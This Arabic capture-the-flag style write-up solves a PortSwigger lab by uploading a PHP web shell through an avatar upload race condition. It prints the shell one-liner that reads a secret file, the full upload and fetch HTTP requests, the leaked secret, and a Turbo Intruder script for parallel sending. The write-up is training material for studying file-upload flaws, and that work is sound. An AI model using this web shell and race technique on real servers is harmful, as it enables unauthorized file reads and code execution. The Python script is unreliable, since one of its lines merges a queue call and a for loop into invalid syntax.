# [Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب.
```http
HTTP/2 403 Forbidden
Date: Tue, 29 Sep 2026 20:34:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171

Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
لذلك سنقوم بتجربة هجوم `Race Condition`
سنقوم بتجهيز طلب رفع الملف وهو كالتالي:
```http
POST /my-account/avatar HTTP/2
Host: 0a2b00b203f1b659803835bc00db0018.web-security-academy.net
Cookie: session=FohVLwoWpudE7EHLkcrWaXroeeZtqZv5
Content-Length: 477
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDqA51ZDQ5bWBoAaU
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0a2b00b203f1b659803835bc00db0018.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2b00b203f1b659803835bc00db0018.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryDqA51ZDQ5bWBoAaU
Content-Disposition: form-data; name="avatar"; filename="TESTTEST.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryDqA51ZDQ5bWBoAaU
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDqA51ZDQ5bWBoAaU
Content-Disposition: form-data; name="csrf"

Xcwb97HUyPNVsXzLjCqdK32l5QlbOnjR
------WebKitFormBoundaryDqA51ZDQ5bWBoAaU--
```

وطلب استدعاء الملف وهو كالتالي:
```http
GET /files/avatars/TESTTEST.php HTTP/2
Host: 0a2b00b203f1b659803835bc00db0018.web-security-academy.net
Cookie: session=FohVLwoWpudE7EHLkcrWaXroeeZtqZv5
```

وسنقوم بتحويلهم إلى `Repeater` ثم نقوم بعمل `Group` لكلاهما معًا، ثم نقوم بعمل `Duplicate` للطلبين عدة مرات وبعدها نقوم بإرسال الطلبات بالتوازي، وقد نحتاج إلى تكرار الأمر عدة مرات ولكن سنلاحظ بعد ذلك أن الاستجابة على الطلب الثاني `GET /files/avatars/TESTTEST.php` يكون بها الـ `Secret`
```http
HTTP/2 200 OK
Date: Tue, 29 Sep 2026 20:34:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

ZoqNLOIUZ4qdmbVk3aXmXYKpTHr5CNpR
```
وهذا يعنى أن هناك نافذة زمنية قصيرة يكون بها الملف موجود على السيرفر ويمكن استدعائه

بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.

**`ملاحظة هامة:`** بما أن هذا اللاب هو بيئة اختبارية فالـ `time window` كبيرة لذلك أمكن حله بإستخدام `Burp Repeater` ولكن في المواقع الحقيقة سيكون هذا شبه مستحيلًا لذلك ستحتاج لإستعمال إضافة `Turbo Intruder` باستخدام سكريبت `Python` كالتالي:
```Python
def queueRequests(target, wordlists):
	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
	request1 = '''<YOUR-POST-REQUEST>'''
	request2 = '''<YOUR-GET-REQUEST>''' 
	
	# the 'gate' argument blocks the final byte of each request until openGate is invoked
	engine.queue(request1, gate='race1') for x in range(5):
		engine.queue(request2, gate='race1')
		
	# wait until every 'race1' tagged request is ready
	# then send the final byte of each request
	# (this method is non-blocking, just like queue)
	engine.openGate('race1')
	engine.complete(timeout=60)
def handleResponse(req, interesting):
	table.add(req)
```
**`ملاحظة:`** عند وضع طلب `GET` داخل كود `Python` لاتنسى إنهائه بشكل صحيح باستخدام تسلسل `\r\n\r\n`، وأيضًا تذكر أن `Python` يحتفظ بأى مسافات بيضاء داخل النصوص لذلك عليك تعديل المسافات البادئة `indentation` وفقًا لذلك لضمان إرسال طلب صحيح.  

## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)
